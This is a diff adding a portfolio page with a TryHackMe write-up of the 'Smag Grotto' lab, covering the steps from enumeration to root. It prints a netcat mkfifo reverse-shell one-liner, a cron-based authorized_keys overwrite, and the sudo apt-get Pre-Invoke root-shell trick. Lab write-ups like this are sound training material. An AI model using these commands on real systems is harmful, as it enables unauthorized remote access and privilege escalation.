@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Smag Grotto | Technical Intelligence Labs</title>
+    <link rel="stylesheet" href="../css/custom.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .markdown-content { font-family: 'Inter', sans-serif; line-height: 1.7; color: #cbd5e1; max-width: 100%; margin: 0 auto; padding-left: 2rem; border-left: 2px solid rgba(255, 255, 255, 0.1); position: relative; }
+        .markdown-content h1 { font-size: 2.5rem; color: #fff; margin-bottom: 2rem; border-bottom: 1px solid #1e293b; padding-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h1::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 10px; height: 10px; background: #fff; border-radius: 50%; box-shadow: 0 0 10px #22c55e; border: 2px solid #0f172a; transform: translateY(-50%); }
+        .markdown-content h2 { font-size: 1.75rem; color: #f8fafc; margin-top: 3rem; margin-bottom: 1rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h2::before { content: ''; position: absolute; left: -2.35rem; top: 50%; width: 8px; height: 8px; background: #22c55e; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content h3 { font-size: 1.25rem; color: #e2e8f0; margin-top: 2rem; margin-bottom: 0.75rem; font-family: 'JetBrains Mono', monospace; position: relative; }
+        .markdown-content h3::before { content: ''; position: absolute; left: -2.3rem; top: 50%; width: 6px; height: 6px; background: #0ea5e9; border-radius: 50%; transform: translateY(-50%); border: 2px solid #0f172a; }
+        .markdown-content code { background: #1e293b; color: #22c55e; padding: 0.2rem 0.4rem; border-radius: 0.25rem; font-family: 'JetBrains Mono', monospace; }
+        .markdown-content pre { background: #1e293b; padding: 1rem; border-radius: 0.5rem; overflow-x: auto; margin-bottom: 2rem; border: 1px solid #334155; position: relative; }
+        .markdown-content pre::before { content: "CODE_BLOCK"; position: absolute; top: 0; right: 0; background: #334155; color: #cbd5e1; font-size: 0.6rem; padding: 0.2rem 0.5rem; font-family: 'JetBrains Mono', monospace; border-bottom-left-radius: 0.5rem; }
+        .markdown-content blockquote { 
+            position: relative;
+            border-left: 2px solid #22c55e; 
+            padding: 1.5rem 0 1.5rem 1.75rem; 
+            color: #cbd5e1; 
+            margin-bottom: 2.5rem; 
+            font-style: normal; 
+            background: rgba(34, 197, 94, 0.03);
+            border-radius: 0 4px 4px 0;
+            box-shadow: inset 20px 0 20px -20px rgba(34, 197, 94, 0.15);
+        }
+        .markdown-content blockquote::before {
+            content: "TECHNICAL_INTELLIGENCE";
+            position: absolute;
+            top: -9px;
+            left: 0;
+            background: #22c55e;
+            color: #000;
+            font-size: 0.6rem;
+            font-weight: bold;
+            padding: 2px 6px;
+            font-family: 'JetBrains Mono', monospace;
+        }
+        .markdown-content ul { list-style-type: disc; padding-left: 1.5rem; margin-bottom: 1.5rem; }
+        .markdown-content p { margin-bottom: 1.5rem; }
+        
+        .diag-card {
+            background: rgba(15, 23, 42, 0.6);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 1rem;
+            font-family: 'JetBrains Mono', monospace;
+            position: relative;
+            overflow: hidden;
+        }
+        .diag-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 2px;
+            height: 100%;
+            background: #22c55e;
+            opacity: 0.5;
+        }
+        .diag-label {
+            display: block;
+            font-size: 0.6rem;
+            text-transform: uppercase;
+            color: #64748b;
+            margin-bottom: 0.25rem;
+            letter-spacing: 0.1em;
+        }
+        .diag-value {
+            font-size: 0.9rem;
+            color: #cbd5e1;
+        }
+        .diag-blink {
+            animation: blink 1s infinite;
+        }
+        @keyframes blink { 50% { opacity: 0; } }
+    </style>
+</head>
+<body class="bg-slate-950 text-slate-200 antialiased selection:bg-accent-green selection:text-slate-900 flex flex-col min-h-screen">
+
+    <!-- Navigation -->
+    <nav class="sticky top-0 z-50 bg-slate-900/90 backdrop-blur-md border-b border-slate-700">
+        <div class="max-w-7xl mx-auto px-6 py-4 flex justify-between items-center">
+            <a href="../index.html" class="logo-container group flex items-center gap-3">
+                 <img src="../images/logo.png" alt="Logo" class="h-10 w-auto group-hover:scale-105 transition-transform duration-300">
+            </a>
+
+            <div class="hidden lg:flex items-center gap-8 font-mono text-sm">
+                <a href="../index.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Home</a>
+                <a href="../about.html" class="text-slate-400 hover:text-accent-cyan transition-colors">About</a>
+                <a href="../devhub.html" class="text-slate-400 hover:text-accent-cyan transition-colors">DevHub</a>
+                <a href="../projects.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Projects</a>
+                <a href="../writeups.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Write-ups</a>
+                <a href="../certificates.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Certs</a>
+                <a href="../contact.html" class="text-slate-400 hover:text-accent-cyan transition-colors">Contact</a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Main Content -->
+    <main class="py-20 px-6 max-w-4xl mx-auto flex-grow w-full">
+        <!-- Post Header -->
+        <header class="mb-12 border-b border-slate-800 pb-12">
+            <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
+                <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
+                <span>// 2025-12-31</span>
+                <span>// ID: REF-Smag Grotto</span>
+            </div>
+            
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Smag Grotto</h1>
+            
+            <div class="flex flex-wrap gap-2">
+                <!-- Tags populated by python -->
+                <!-- tryhackme -->
+            </div>
+        </header>
+
+        <!-- Markdown Body -->
+        <div class="markdown-content">
+            <h1>Smag Grotto</h1>
+<h2>Nmap Scan</h2>
+<p>We will discover port 22 and 80 are open.   </p>
+<pre class="codehilite"><code class="language-bash">PORT      STATE    SERVICE        REASON      VERSION
+22/tcp    open     ssh            syn-ack     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDORe0Df8XvRlc3MvkqhpqAX5/sbUoEiIckKSVOLJVmWb9jOq2r0AfjaYAAZzgH9RThlwbzjGj6r4yBsXrMFB01qemsYBzUkut9Q12P+uly9+SeL6X7CUavLnkcAz0bzkqQpIFLG9HUyu9ysmZqE1Xo6NumtNh3Bf4H1BbS+cRntagn1TreTWJUiT+s7Gr9KEIH7rQUM8jX/eD/zNTKMN9Ib6/TM7TkPxAnOSw5JRfTV/oC8fFGqvjcAMxlhqS44AL/ZziI50OrCX9rMKtjZuvPaW2U31Sr8nUmtd3jnJPjMH2ZRfeRTPybYOblPOZq5lV2Fu4TwF/xOv2OrACLDxj5
+|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN6hWP9VGah8N9DAM3Kb0OZlIEttMMjf+PXwLWfHf0dz6OtdbrEjblgrck0i7fT95F1qdRJHtBdEu5yg4r6/gkY=
+|   256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPWHQ800Vx/X5aGSIDdpkEuKgFDxnjak46F/IsegN2Ju
+80/tcp    open     http           syn-ack     Apache httpd 2.4.18 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Smag
+</code></pre>
+
+<h2>Web Enum</h2>
+<ul>
+<li>Gobuster <br />
+By running gobuster we will find <code>/mail</code> directory<br />
+<code>bash
+    =====================================================
+    Gobuster v2.0.1              OJ Reeves (@TheColonial)
+    =====================================================
+    [+] Mode         : dir
+    [+] Url/Domain   : http://smag.thm/
+    [+] Threads      : 10
+    [+] Wordlist     : /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+    [+] Status codes : 200,204,301,302,307,403
+    [+] Timeout      : 10s
+    =====================================================
+    2020/07/30 10:18:48 Starting gobuster
+    =====================================================
+    /mail (Status: 301)</code><br />
+Going to <code>/mail</code> will give us access to a conversation that includes a <code>.pcap</code> file.   </li>
+<li>The page</li>
+</ul>
+<h2>Wireshark</h2>
+<p>Taking a good look at the traffic, we can find an HTTP Post request to development.smag.thm/login.php. In the packet, we can see the username and pass in clear text.   </p>
+<p>with the credential, we can go to <code>development.smag.thm</code> and try to get access to <code>/admin.php</code>.   </p>
+<h2>Getting In</h2>
+<p>Add development.smag.thm to your <code>/etc/hosts</code> and access it through browser. <br />
+- /etc/hosts<br />
+<code>bash
+    127.0.0.1   localhost
+    127.0.1.1   reza-HP-Spectre
+    172.16.122.129  hekerendonesa
+    10.10.228.117   smag.thm    development.smag.thm &lt; ----
+    10.10.70.17 windcorp.thm    fire.windcorp.thm
+    172.16.122.130  nugroho-server</code><br />
+- Acessing <code>development.smag.thm</code>   </p>
+<p>log in with credential we get from the <code>.pcap</code> file and we will be redirected to <code>admin.php</code>   </p>
+<p>Here we have a web shell that will not print out the output of the command, so we can just execute a reverse shell command <br />
+<code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;YOUR_IP&gt; &lt;PORT&gt; &gt;/tmp/f</code> <br />
+And we will have access to the machine as <code>www-data</code>   </p>
+<h2>Getting Access to Jake</h2>
+<ul>
+<li>
+<p>Enum<br />
+I tried to use <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">linpeas</a> to find Priv Esc vector and found that there is an interesting cronjob. <br />
+    ```bash<br />
+    SHELL=/bin/sh<br />
+    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</p>
+<h1>m h dom mon dow user  command</h1>
+<p>17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly<br />
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )<br />
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )<br />
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )<br />
+*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup &gt; /home/jake/.ssh/authorized_keys &lt;--- We can abuse this<br />
+<code>``
+from that, we know that we can change the content of</code>/opt/.backups/jake_id_rsa.pub.backup` from jake's public key to our public key. <br />
+After changing that, we can access jake's account with no password.   </p>
+</li>
+</ul>
+<h2>Getting to Root</h2>
+<p>From the moment i get access to user <code>jake</code>, the first thing i tried is to check jake's sudo privilege with the command <code>sudo -l</code>.<br />
+And here's what i got </p>
+<pre class="codehilite"><code class="language-bash">jake@smag:~$ sudo -l
+Matching Defaults entries for jake on smag:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on smag:
+    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
+</code></pre>
+
+<p>So just go to <a href="https://gtfobins.github.io/">GTFOBins</a> and find <code>apt-get</code>   </p>
+<p>Just run <code>sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh</code> and you will get root shell.   </p>
+<h1>HAPPY HACKING!!!</h1>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
+        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
+            <div class="diag-card text-left">
+                <span class="diag-label">Access_Level</span>
+                <span class="diag-value">OMNI_READ_ONLY</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Encryption</span>
+                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">Signal_Strength</span>
+                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
+            </div>
+            <div class="diag-card text-left">
+                <span class="diag-label">System_Status</span>
+                <span class="diag-value">STABLE_HARDENED</span>
+            </div>
+        </div>
+
+        <div class="flex justify-center gap-6 mb-8">
+            <a href="https://github.com/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
+                    class="fa-brands fa-github"></i></a>
+            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
+                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
+                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
+            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
+                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
+                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
+        </div>
+        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
+    </footer>
+
+    <script src="../js/main.js"></script>
+</body>
+</html>
